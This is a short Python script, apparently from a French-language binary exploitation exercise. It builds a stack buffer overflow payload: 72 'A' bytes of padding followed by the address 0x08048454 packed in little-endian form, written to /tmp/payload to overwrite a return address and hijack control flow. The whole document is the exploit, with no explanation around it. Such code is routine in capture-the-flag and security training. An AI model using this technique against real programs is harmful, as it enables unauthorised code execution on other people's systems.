import struct

adresse = 0x08048454
adresse_little_endian = struct.pack("<I", adresse)  # "<I" = little-endian, 4 octets
print(adresse_little_endian)

buffer = b"A" * 72

payload = buffer + adresse_little_endian

with open("/tmp/payload", "wb") as f:
    f.write(payload)
